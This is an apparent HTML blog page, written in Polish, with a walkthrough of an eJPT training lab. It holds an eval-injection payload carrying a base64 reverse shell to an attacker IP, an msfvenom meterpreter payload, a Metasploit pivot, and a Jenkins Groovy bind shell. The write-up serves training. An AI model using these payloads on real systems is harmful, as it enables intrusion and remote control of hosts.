@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Black-Box Penetration Test 2 | Mateusz Suszczyk</title>
+<meta name="keywords" content="Linux, Easy, eJPT" />
+<meta name="description" content="Lab rozwiązany podczas przygotowań do egzaminu eJPT.">
+<meta name="author" content="Mateusz Suszczyk">
+<link rel="canonical" href="https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-2/" />
+<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.92.2" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Black-Box Penetration Test 2" />
+<meta property="og:description" content="Lab rozwiązany podczas przygotowań do egzaminu eJPT." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-2/" />
+<meta property="og:image" content="https://suszczyk.github.io/thumbnails/.jpg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-06-20T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-06-20T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/.jpg" />
+<meta name="twitter:title" content="Black-Box Penetration Test 2"/>
+<meta name="twitter:description" content="Lab rozwiązany podczas przygotowań do egzaminu eJPT."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://suszczyk.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Black-Box Penetration Test 2",
+      "item": "https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Black-Box Penetration Test 2",
+  "name": "Black-Box Penetration Test 2",
+  "description": "Lab rozwiązany podczas przygotowań do egzaminu eJPT.",
+  "keywords": [
+    "Linux", "Easy", "eJPT"
+  ],
+  "articleBody": "Description Lab Environment In this lab environment, the user is going to get access to a Kali GUI instance. A web server can be accessed using the tools installed on Kali on http://online-calc.com. However, there is another machine in the setup which is not accessible from the Kali machine but is accessible from the web server.\nObjective: Compromise both machines to retrieve the flags!\nTools The best tools for this lab are:\n dirb Metasploit Framework Proxychains A Web Browser  Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course, will dramatically reduce the benefits of a hands-on lab!\n Black-Box Penetration Test 2 - 20.06.2022 r. Na start otrzymujemy link do strony http://online-calc.com.\nPo przejściu ukazuje się jedynie strona domyślna Apache2.\nroot@INE:~# ping online-calc.com PING online-calc.com (192.154.245.3) 56(84) bytes of data. 64 bytes from online-calc.com (192.154.245.3): icmp_seq=1 ttl=64 time=0.115 ms 64 bytes from online-calc.com (192.154.245.3): icmp_seq=2 ttl=64 time=0.048 ms Po spingowaniu wiem, że IP to 192.154.245.3.\nNmap root@INE:~# nmap -sC -sV 192.154.245.3 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 05:21 IST Nmap scan report for online-calc.com (192.154.245.3) Host is up (0.0000090s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) 5000/tcp open upnp? | fingerprint-strings: | DNSVersionBindReqTCP, RTSPRequest, SMBProgNeg, ZendJavaBridge: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest, HTTPOptions: | HTTP/1.1 200 OK | Content-Length: 1127 | Content-Disposition: inline; filename=\"index.html\" | Accept-Ranges: bytes | ETag: \"e021c45eee1c6fcb7629edafba897555f86958c5\" | Content-Type: text/html; charset=utf-8 | Vary: Accept-Encoding | Date: Sun, 19 Jun 2022 23:51:45 GMT | Connection: close | =en=utf-8=X-UA-Compatible content=\"IE=edge\"=viewport content=\"width=device-width,initial-scale=1\"=icon href=../../../favicon.icoonline-calc=text/css/* Your local CSS File */ | @font-face { | font-family: 'Roboto'; | font-style: normal; | font-weight: 700; | src: local('Roboto-Regular'), local('Roboto-Medium'), url(fonts/Roboto-Medium.ttf) format('truetype'); |_ }=/css/main.7ee6b179.css rel=prefetch=/js/main.7112507e.js rel=prefetch(Python 2.7.17) |_http-title: Site doesnt have a title (text/html; charset=utf-8). | http-git: | 192.154.245.3:8000/.git/ | Git repository found! | .git/config matched patterns 'passw' 'user' | Repository description: Unnamed repository; edit this file 'description' to name the... | Last commit message: Minor formatting and removed unneeded functions... | Remotes: |_ http://online-calc.com/projects/online-calc 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port5000-TCP:V=7.92%I=7%D=6/20%Time=62AFB691%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,583,HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Length:\\x201127\\r\\nCont SF:ent-Disposition:\\x20inline;\\x20filename=\\\"index\\.html\\\"\\r\\nAccept-Range SF:s:\\x20bytes\\r\\nETag:\\x20\\\"e021c45eee1c6fcb7629edafba897555f86958c5\\\"\\r\\ SF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nVary:\\x20Accept-Encodi SF:ng\\r\\nDate:\\x20Sun,\\x2019\\x20Jun\\x202022\\x2023:51:45\\x20GMT\\r\\nConnecti SF:on:\\x20close\\r\\n\\r\\n\\x20html\\x20lang=en\\x20c SF:harset=utf-8\\x20http-equiv=X-UA-Compatible\\x20content=\\\"IE=edge\\\" SF:\\x20name=viewport\\x20content=\\\"width=device-width,initial-scale=1 SF:\\\"\\x20rel=icon\\x20href=../../../favicon\\.icoonline-calc\\x20type=text/css/\\*\\x20Your\\x20local\\x20CSS\\x20File\\x20\\*/\\n\\x20\\ SF:x20\\x20\\x20\\x20\\x20@font-face\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20font-family:\\x20'Roboto';\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0font-style:\\x20normal;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-w SF:eight:\\x20700;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20src:\\x20local\\( SF:'Roboto-Regular'\\),\\x20local\\('Roboto-Medium'\\),\\x20url\\(fonts/Roboto-M SF:edium\\.ttf\\)\\x20format\\('truetype'\\);\\n\\x20\\x20\\x20\\x20\\x20\\x20}\\x20href=../../../css/main\\.7ee6b179\\.css\\x20rel=prefetch\\x20href=../../../ SF:js/main\\.7112507e\\.js\\x20rel=prefetch\\x20hre\")%r(RTSPRequest,2F,\" SF:HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r( SF:DNSVersionBindReqTCP,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnecti SF:on:\\x20close\\r\\n\\r\\n\")%r(SMBProgNeg,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Requ SF:est\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(ZendJavaBridge,2F,\"HTTP/1\\.1\\x2 SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(HTTPOptions, SF:583,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Length:\\x201127\\r\\nContent-Dispo SF:sition:\\x20inline;\\x20filename=\\\"index\\.html\\\"\\r\\nAccept-Ranges:\\x20byt SF:es\\r\\nETag:\\x20\\\"e021c45eee1c6fcb7629edafba897555f86958c5\\\"\\r\\nContent- SF:Type:\\x20text/html;\\x20charset=utf-8\\r\\nVary:\\x20Accept-Encoding\\r\\nDat SF:e:\\x20Sun,\\x2019\\x20Jun\\x202022\\x2023:51:45\\x20GMT\\r\\nConnection:\\x20cl SF:ose\\r\\n\\r\\n\\x20html\\x20lang=en\\x20charset=ut SF:f-8\\x20http-equiv=X-UA-Compatible\\x20content=\\\"IE=edge\\\"\\x2 SF:0name=viewport\\x20content=\\\"width=device-width,initial-scale=1\\\"\\ SF:x20rel=icon\\x20href=../../../favicon\\.icoonline-calc\\x20t SF:ype=text/css/\\*\\x20Your\\x20local\\x20CSS\\x20File\\x20\\*/\\n\\x20\\x20\\x20\\x SF:20\\x20\\x20@font-face\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font SF:-family:\\x20'Roboto';\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-sty SF:le:\\x20normal;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-weight:\\x2 SF:0700;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20src:\\x20local\\('Roboto-R SF:egular'\\),\\x20local\\('Roboto-Medium'\\),\\x20url\\(fonts/Roboto-Medium\\.tt SF:f\\)\\x20format\\('truetype'\\);\\n\\x20\\x20\\x20\\x20\\x20\\x20}\\x2 SF:0href=../../../css/main\\.7ee6b179\\.css\\x20rel=prefetch\\x20href=../../../js/main\\. SF:7112507e\\.js\\x20rel=prefetch\\x20hre); MAC Address: 02:42:C0:9A:F5:03 (Unknown) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds Od razu moją uwagę przykuł port 8000. Sprawdziłem go najpierw małym słownikiem common.txt, a następnie większym, domyślnym raft-medium-directories.txt.\nroot@INE:~# feroxbuster -u http://online-calc.com:8000 -w /usr/share/seclists/Discovery/Web-Content/common.txt ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher 邏 ver: 2.4.1 ───────────────────────────┬──────────────────────  Target Url │ http://online-calc.com:8000  Threads │ 50  Wordlist │ /usr/share/seclists/Discovery/Web-Content/common.txt  Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]  Timeout (secs) │ 7 說 User-Agent │ feroxbuster/2.4.1  Config File │ /etc/feroxbuster/ferox-config.toml  Recursion Depth │ 4 ───────────────────────────┴──────────────────────  Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 1l 2w 23c http://online-calc.com:8000/.git/HEAD 200 92l 244w 1474c http://online-calc.com:8000/.git/config 200 2l 4w 209c http://online-calc.com:8000/.git/index 200 52l 186w 1985c http://online-calc.com:8000/console root@INE:~# feroxbuster -u http://192.154.245.3:8000 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher 邏 ver: 2.4.1 ───────────────────────────┬──────────────────────  Target Url │ http://192.154.245.3:8000  Threads │ 50  Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]  Timeout (secs) │ 7 說 User-Agent │ feroxbuster/2.4.1  Config File │ /etc/feroxbuster/ferox-config.toml  Recursion Depth │ 4 ───────────────────────────┴──────────────────────  Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 52l 186w 1985c http://192.154.245.3:8000/console 200 1l 3w 31c http://192.154.245.3:8000/evaluate [####################] - 1m 29999/29999 0s found:2 errors:1  [####################] - 1m 29999/29999 452/s http://192.154.245.3:8000 /console /evaluate Podstrona /console zdaje się mieć zabezpieczenie poprzez PIN. Sprawdziłem jak wpisanie przykładowego pinu i wciśnięcię Confirm PIN widać w BurpSuite.\nZmieniłem jedną cyfre w pinie. Parametr s nie zmienił się. Postanowiłem spróbować bruteforca, ponieważ serwer daje wyraźny response o niepoprawnym pinie.\n/.git Są pewne dane dostępu jeremy:diamonds.\nJest również wzmianka o dodatkowym URLu. Ponieważ jest to remote orgin, prawdopodobnie możemy go sklonować.\nroot@INE:~# git clone http://online-calc.com/projects/online-calc Cloning into 'online-calc'... remote: Counting objects: 26, done. remote: Compressing objects: 100% (26/26), done. remote: Total 26 (delta 8), reused 0 (delta 0) Unpacking objects: 100% (26/26), 4.25 KiB | 724.00 KiB/s, done. root@INE:~/online-calc# ls -al total 24 drwxr-xr-x 3 root root 4096 Jun 20 17:03 . drwx------ 1 root root 4096 Jun 20 17:03 .. -rw-r--r-- 1 root root 2233 Jun 20 17:03 API.py drwxr-xr-x 8 root root 4096 Jun 20 17:03 .git -rw-r--r-- 1 root root 387 Jun 20 17:03 utils.py Plik API.py zawiera informacje o działaniu kalkulatora z portu 5000.\nTest aplikacji kalkulatora BurpSuite Po wykonaniu testowego “zapytania” otrzymałem w Burpie taki request.\nPrawdopodobnie chodzi o parametr expr. Dozwolone znaki to 0123456789+-*/%.()\". Niestety po zbyt wielu próbach jest komunikat Access Denied\": \"Too many requests., zatem zawaansowany sqlmap nie wchodzi w grę.\nMożna powiedzieć, że uzyskałem Command Injection. Zauważyłem, że przy wpisywaniu funkcji Pythona, API wyrzuca komunikaty. Można to wykorzystać importując bibliotekę os, która pozwala na wykonywanie prostych komend.\nRozumiałem, że muszę oszukać system, by przechwycić “nieporządane” znaki do payloada. Dodałem wszystkie duże i małe litery oraz inne do dozwolonych znaków. W ten sposób program “przepuszcza” mój request.\nOstateczny payload wygląda tak:\n{\"expr\":\"__import__('os').system('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuODAuOC4yLzkwMDEgMD4mMSIK | base64 -d | bash')\"} Wykonuje on poniższy kod:\nbash -c \"bash -i \u0026 /dev/tcp/192.80.8.2/9001 0\u00261\" Nasłuchiwanie na porcie 9001 i uruchomienie requesta w BurpSuite powoduje otrzymanie shella.\nW folderze roota nie było flagi. Znalazłem ją poprzez find.\nfind . -name flag Flaga była w folderze /tmp\nflag\n3b2b474c06380f696b38c1498f795e054374 Pivot do drugiej maszyny root@online-calc:/# ip addr ip addr 1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 2: ip_vti0@NONE:  mtu 1480 qdisc noop state DOWN group default qlen 1000 link/ipip 0.0.0.0 brd 0.0.0.0 29400: eth0@if29401:  mtu 1500 qdisc noqueue state UP group default link/ether 02:42:c0:50:08:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.80.8.3/24 brd 192.80.8.255 scope global eth0 valid_lft forever preferred_lft forever 29402: eth1@if29403:  mtu 1500 qdisc noqueue state UP group default link/ether 02:42:c0:cf:ce:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.207.206.2/24 brd 192.207.206.255 scope global eth1 valid_lft forever preferred_lft forever Adres obecnej maszyny do której musimy się dostać to 192.207.206.x. Ponieważ nie mam dostępu do narzędzi “spoza” środowiska. Muszę użyć msfvenom i Metasploit.\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.80.8.2 LPORT=9010 -f elf  exp.bin Pobrałem plik z maszyny używając serwera http od Pythona. Włączyłem Metasploit na multi/handler oraz ten sam payload co msfvenom czyli linux/x64/meterpreter/reverse_tcp oraz IP. Dostałem połączenie. Próbowałem wykonać pivot poprzez autoroute w Metasploicie jednak coś nie działało poprawnie. Musiałem użyć modułu auxiliary/server/socks_proxy. Jednak najpierw muszę przeprowadzić routing na nową podsieć.\nmsf6 exploit(multi/handler)  route add 192.43.33.0/24 1 [*] Route added Ustawiam port na 9050, ponieważ INE w swoich labach ma domyślne ustawienia SOCKS w `` /etc/proxychains4.conf na port socks4 127.0.0.1 9050.\nWiedziałem, że druga maszyna ma IP 192.207.206.3 z poprzednich prób z Metasploitem.\nTeraz możemy przerowadzić skan portów przez proxychains.\nuse auxiliary/server/socks_proxy set SRVPORT 9050 set VERSION 4a msf6 auxiliary(server/socks_proxy)  proxychains nmap -sT -P0 192.207.206.3 Nmap scan report for ns1.recife.pe.gov.br (192.207.206.3) Host is up (0.0011s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE 8080/tcp open http-proxy Teraz po tych wszystkich operacjach, gdy wejdziemy w proxy przeglądarki i ustawimy na 127.0.0.1 port z proxychaina czyli 9050, możemy wejść na port 8080 z “obcej” sieci.\nPanel Jenkins Wersja Jenkins ver. 2.225.\nProsty command injection w Jenkinsie.\ncmd='whoami' println cmd.execute().text Otrzymanie shella jest równie proste.\nint port=5555; String cmd=\"/bin/sh\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start() Socket s = new java.net.ServerSocket(port).accept() InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()0)so.write(pi.read());while(pe.available()0)so.write(pe.read());while(si.available()0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Następnie łączę się z drugą maszyną przez dany port 5555.\nroot@INE:/usr/share/nishang/Shells# proxychains nc -v 192.43.33.3 5555 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.15 Ncat: Version 7.92 ( https://nmap.org/ncat ) [proxychains] Strict chain ... 127.0.0.1:9050 ... 192.43.33.3:5555 ... OK Ncat: Connected to 192.43.33.3:5555. id uid=105(jenkins) gid=108(jenkins) groups=108(jenkins) :)\n",
+  "wordCount" : "1456",
+  "inLanguage": "en",
+  "image":"https://suszczyk.github.io/thumbnails/.jpg","datePublished": "2022-06-20T00:00:00Z",
+  "dateModified": "2022-06-20T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mateusz Suszczyk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Mateusz Suszczyk",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://suszczyk.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
+                    <span>Archiwum</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
+                    <span>Kategorie</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/tags/" title="Tagi">
+                    <span>Tagi</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/search/" title="Szukaj">
+                    <span>Szukaj</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;»&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Black-Box Penetration Test 2
+    </h1>
+    <div class="post-meta"><span title='2022-06-20 00:00:00 +0000 UTC'>June 20, 2022</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Mateusz Suszczyk
+
+</div>
+  </header> 
+<figure class="entry-cover"><img loading="lazy" src="https://suszczyk.github.io/thumbnails/.jpg" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#description" aria-label="Description">Description</a><ul>
+                        
+                <li>
+                    <a href="#lab-environment" aria-label="Lab Environment">Lab Environment</a></li>
+                <li>
+                    <a href="#tools" aria-label="Tools">Tools</a></li></ul>
+                </li>
+                <li>
+                    <a href="#black-box-penetration-test-2---20062022-r" aria-label="Black-Box Penetration Test 2 - 20.06.2022 r.">Black-Box Penetration Test 2 - 20.06.2022 r.</a><ul>
+                        
+                <li>
+                    <a href="#nmap" aria-label="Nmap">Nmap</a><ul>
+                        
+                <li>
+                    <a href="#console" aria-label="/console"><code>/console</code></a></li>
+                <li>
+                    <a href="#evaluate" aria-label="/evaluate"><code>/evaluate</code></a></li>
+                <li>
+                    <a href="#git" aria-label="/.git"><code>/.git</code></a></li>
+                <li>
+                    <a href="#test-aplikacji-kalkulatora-burpsuite" aria-label="Test aplikacji kalkulatora BurpSuite">Test aplikacji kalkulatora BurpSuite</a></li></ul>
+                </li>
+                <li>
+                    <a href="#pivot-do-drugiej-maszyny" aria-label="Pivot do drugiej maszyny">Pivot do drugiej maszyny</a></li>
+                <li>
+                    <a href="#panel-jenkins" aria-label="Panel Jenkins">Panel Jenkins</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h1>
+<h2 id="lab-environment">Lab Environment<a hidden class="anchor" aria-hidden="true" href="#lab-environment">#</a></h2>
+<p>In this lab environment, the user is going to get access to a Kali GUI instance. A web server can be accessed using the tools installed on Kali on <a href="http://online-calc.com/">http://online-calc.com</a>. However, there is another machine in the setup which is not accessible from the Kali machine but is accessible from the web server.</p>
+<p><strong>Objective:</strong> Compromise both machines to retrieve the flags!</p>
+<h2 id="tools">Tools<a hidden class="anchor" aria-hidden="true" href="#tools">#</a></h2>
+<p>The best tools for this lab are:</p>
+<ul>
+<li>dirb</li>
+<li>Metasploit Framework</li>
+<li>Proxychains</li>
+<li>A Web Browser</li>
+</ul>
+<p><strong>Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course, will dramatically reduce the benefits of a hands-on lab!</strong></p>
+<hr>
+<h1 id="black-box-penetration-test-2---20062022-r">Black-Box Penetration Test 2 - 20.06.2022 r.<a hidden class="anchor" aria-hidden="true" href="#black-box-penetration-test-2---20062022-r">#</a></h1>
+<p>Na start otrzymujemy link do strony <a href="http://online-calc.com">http://online-calc.com</a>.</p>
+<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220620015012.png" alt=""  />
+</p>
+<p>Po przejściu ukazuje się jedynie strona domyślna Apache2.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# ping online-calc.com
+PING online-calc.com <span style="color:#f92672">(</span>192.154.245.3<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+<span style="color:#ae81ff">64</span> bytes from online-calc.com <span style="color:#f92672">(</span>192.154.245.3<span style="color:#f92672">)</span>: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.115 ms
+<span style="color:#ae81ff">64</span> bytes from online-calc.com <span style="color:#f92672">(</span>192.154.245.3<span style="color:#f92672">)</span>: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.048 ms
+</code></pre></div><p>Po spingowaniu wiem, że IP to <code>192.154.245.3</code>.</p>
+<h2 id="nmap">Nmap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@INE:~# nmap -sC -sV 192.154.245.3
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-06-20 05:21 IST
+Nmap scan report <span style="color:#66d9ef">for</span> online-calc.com <span style="color:#f92672">(</span>192.154.245.3<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.0000090s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP, RTSPRequest, SMBProgNeg, ZendJavaBridge:                                                                                                                          
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request                                                                                                                                                              
+|     Connection: close                                                                                                                                                                     
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Content-Length: <span style="color:#ae81ff">1127</span>
+|     Content-Disposition: inline; filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.html&#34;</span>
+|     Accept-Ranges: bytes
+|     ETag: <span style="color:#e6db74">&#34;e021c45eee1c6fcb7629edafba897555f86958c5&#34;</span>
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+|     Vary: Accept-Encoding
+|     Date: Sun, <span style="color:#ae81ff">19</span> Jun <span style="color:#ae81ff">2022</span> 23:51:45 GMT
+|     Connection: close
